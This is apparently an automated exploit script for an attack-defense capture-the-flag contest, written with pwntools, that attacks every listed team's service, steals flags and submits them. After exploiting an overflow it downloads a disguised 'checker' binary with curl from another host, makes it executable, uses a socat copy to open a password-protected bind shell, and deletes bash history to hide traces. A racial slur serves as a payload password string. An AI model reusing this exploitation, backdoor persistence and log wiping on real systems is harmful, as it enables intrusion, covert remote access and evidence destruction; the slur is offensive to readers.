import requests
import multiprocessing
import time
from pwn import *

# CONFIGURATION
SUBMITTER_SERVER = f"http://10.0.3.2:8900"
CHALL_ID = '2'
CHALL_PORT = 10004
SELF_IP = '10.0.2.32'
IP_LOCAL = '10.0.3.2'
TIMEOUT = 300
FLAG_FORMAT="LKS{"
TICK_DURATION = 300 #in seconds

# BACKDOOR CONFIGURATION
SPAWN_SHELL_PORT = 8001
BACKDOOR_FILE_PATH = '/home/user/.local/lib/python3.12/site-packages/checker'
BACKDOOR_PASSWORD = "stembajaya7777"
FLAG_PATH = "/home/user/flag.txt"
  
def exploit(target, port):
  try:
    # exploit goes here
    # start
    p = remote(target, port)
    context.log_level = 'error'  # Suppress debug output
    
    payload = b"bekti" + (b"\x00"*(50 - len("bekti")))
    payload += b"nigga" + (b"\x00"*(50 - len("nigga")))
    payload += b"admin" + (b"\x00"*(50 - len("admin")))
    
    p.sendline(b"2")
    p.sendline(b"bekti")
    p.sendline(b"nigga")

    p.sendline(b"3")
    p.sendline(b"bekti")
    p.sendline(b"nigga")

    p.sendline(b"4")
    p.sendline(b"150")
    p.sendline(payload)

    p.sendline(b"1")
    p.sendline(b"bekti")
    p.sendline(b"nigga")
    
    p.sendline(b"cat ~/flag.txt")
    p.recvuntil(b"Hello Admin")

    flag = p.recv().strip().decode()
    
    # backdoor injection
    print('='*50 + " BACKDOOR INJECTION 💀 " + '='*50)
    
    p.sendline(f"curl http://{IP_LOCAL}:8900/fetchchecker -o {BACKDOOR_FILE_PATH}; ls -la {BACKDOOR_FILE_PATH}".encode())
    
    # skip curl output | DONT CHANGE
    for _ in range(3):
        p.recvline()
      
    p.sendline(f"chmod +x {BACKDOOR_FILE_PATH}".encode())
    p.sendline(f"ls -la {BACKDOOR_FILE_PATH}".encode())
    response = p.recv().strip().decode()
    print(f"[+] Response: {response}")
    
    p.sendline(b"rm /tmp/checker & cp /bin/socat /tmp/checker")
    p.sendline(f"/tmp/checker TCP-LISTEN:{SPAWN_SHELL_PORT},reuseaddr,fork EXEC:{BACKDOOR_FILE_PATH},stderr,pty,cfmakeraw,echo=0 &".encode())
    p.sendline(b"rm ~/.bash_history")

    p.close()
    
    # flag confirm
    if FLAG_FORMAT not in flag:
      raise Exception(f"Flag not found")
    
    return flag
  except Exception as e:
    print(f"[-] Error: {e} ({target})")
    return
  
def exploit_backdoor(target, portSpawnShell) :
  try:
    # spawn shell
    p = remote(target, portSpawnShell)
    context.log_level = 'error'

    p.sendlineafter(b"Password: ", BACKDOOR_PASSWORD.encode())
    p.recvuntil(b"checker active on port: ")
    port_target = int(p.recvline().strip().decode())
    p.close()
    
    print('='*30)
    print(f"[+] Backdoor active on port: {target} {port_target}")

    # connect to shell, do the exploit
    r = remote(target, port_target)
    context.log_level = 'error'

    # exploit goes here
    # start
    r.sendline(f"cat {FLAG_PATH}".encode())
    r.recvuntil(b"$ ")
    flag = r.recvline().strip().decode().replace("}.", "}")
    print(flag)
    r.close()
    
    if FLAG_FORMAT not in flag:
      raise Exception(f"Flag not found")
    
    return flag
  except Exception as e:
    print(f"[-] Error: {e} ({target})")
    return

def process_exploit(target_ip, port):
  try:
    print('='*50 + " EXPLOIT START " + '='*50)
    print(f"[+] Target IP: {target_ip}")

    print('='*50 + " TRY BACKDOOR EXPLOIT " + '='*50)
    flag = exploit_backdoor(target_ip, SPAWN_SHELL_PORT)
    
    if not flag :
        print('='*50 + " TRY EXPLOIT " + '='*50)
        flag = exploit(target_ip, port)

        if not flag:
            print(f"[-] Exploit failed ({target_ip})")
            return

    print(f"[+] Flag from {target_ip}: {flag}")

    res = requests.post(SUBMITTER_SERVER+"/submit", json={'flag': flag}, timeout=60)

    if res.status_code != 200:
      print(f"[-] Submit failed for {target_ip}: {res.status_code}")
      print(res.text)
    else:
      print(f"[+] Submitter response: {res.text}")

  except requests.exceptions.Timeout :
    print("!!!!!!!SUBMITTER BERMASALAH!!!!!!!")
    print("segera periksa error pada submiter")

  except Exception as e:
    print(f"[-] Error: {e}")

def main():
    # Config server dan port
    services =  requests.get(url=SUBMITTER_SERVER+"/services").json()['data'][CHALL_ID]
    
    print(f"[+] Services: {services}")

    # optional
    # filter services to exclude yout own IP
    # services = {k: v for k, v in services.items() if v != SELF_IP}

    timer = 0
    
    while True:
        if timer > 0:
            print(f"[+] Next Exploit in: {timer} seconds", end="\r")
            timer -= 1
            time.sleep(1)
            continue
      
        start_time = time.time()

        for target_id, target_ip in services.items():
            process = multiprocessing.Process(target=process_exploit, args=(target_ip, CHALL_PORT))
            process.start()

            process.join(timeout=TIMEOUT)

            if process.is_alive():
                print(f"[-] Timeout! Terminating exploit for {target_ip}")
                process.terminate()
                process.join()

        # reset timer goes here in seconds    
        elapsed = time.time() - start_time
        timer = max(0, TICK_DURATION - int(elapsed))
        
if __name__ == "__main__":
    main()
